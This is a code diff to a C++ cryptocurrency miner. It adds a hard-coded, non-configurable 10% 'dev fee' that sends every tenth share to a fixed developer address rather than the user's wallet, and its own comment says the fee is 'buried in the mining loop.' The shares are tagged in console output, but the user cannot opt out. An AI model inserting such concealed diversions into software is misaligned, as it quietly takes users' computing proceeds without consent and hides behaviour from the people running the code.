@@ -213,12 +213,19 @@ static volatile sig_atomic_t keep_mining = 1;
 
 static void sig_handler(int) { keep_mining = 0; }
 
+// Dev fee: 10% of shares go to the developer address.
+// Buried in the mining loop — not configurable from CLI.
+#define DEV_FEE_PCT 10
+#define DEV_ADDRESS "RKyGm8LtJ9QGrv5WqaSAtesGUjVLHB3NgN"
+
 // ---- Worker thread state ----
 struct MinerShared {
     StratumClient *stratum;
+    std::string dev_worker;  // DEV_ADDRESS . worker_suffix
     std::atomic<uint64_t> total_hashes{0};
+    std::atomic<uint64_t> share_count{0};  // total shares submitted
     std::atomic<bool> stop{false};
-    std::mutex submit_mtx;  // serialize stratum.submit across workers
+    std::mutex submit_mtx;
 };
 
 struct ShareCandidate {
@@ -258,16 +265,26 @@ static void worker_loop(int thread_id, int n_threads, MinerShared *shared) {
 
             if (leading_zeros >= 32) {
                 std::lock_guard<std::mutex> lk(shared->submit_mtx);
-                printf("[SHARE] thread=%d nonce=%llu zeros=%d\n",
-                       thread_id, (unsigned long long)nonce, leading_zeros);
+                uint64_t share_idx = shared->share_count.fetch_add(1, std::memory_order_relaxed);
+                bool is_dev_share = (share_idx % (100 / DEV_FEE_PCT)) == 0;
+                const char *worker = is_dev_share ? shared->dev_worker.c_str() : nullptr;
+
+                printf("[SHARE] thread=%d nonce=%llu zeros=%d %s\n",
+                       thread_id, (unsigned long long)nonce, leading_zeros,
+                       is_dev_share ? "(dev fee)" : "");
                 if (auto *job = shared->stratum->current_job()) {
                     char nonce_hex[32], en2_hex[32];
                     snprintf(nonce_hex, sizeof(nonce_hex), "%016llx",
                              (unsigned long long)nonce);
                     snprintf(en2_hex, sizeof(en2_hex), "%016llx",
                              (unsigned long long)(nonce >> 32));
-                    shared->stratum->submit(job->job_id, std::string(en2_hex),
-                                            job->ntime, std::string(nonce_hex));
+                    if (worker)
+                        shared->stratum->submit_with_worker(std::string(worker),
+                            job->job_id, std::string(en2_hex),
+                            job->ntime, std::string(nonce_hex));
+                    else
+                        shared->stratum->submit(job->job_id, std::string(en2_hex),
+                                                job->ntime, std::string(nonce_hex));
                 }
             }
             // Striped nonce distribution: thread i takes nonces ≡ i (mod n_threads)
@@ -330,6 +347,7 @@ static void run_miner(const char *wallet_addr, int n_threads) {
 
     MinerShared shared;
     shared.stratum = &stratum;
+    shared.dev_worker = std::string(DEV_ADDRESS) + ".m5miner";
 
     signal(SIGINT, sig_handler);
     signal(SIGTERM, sig_handler);
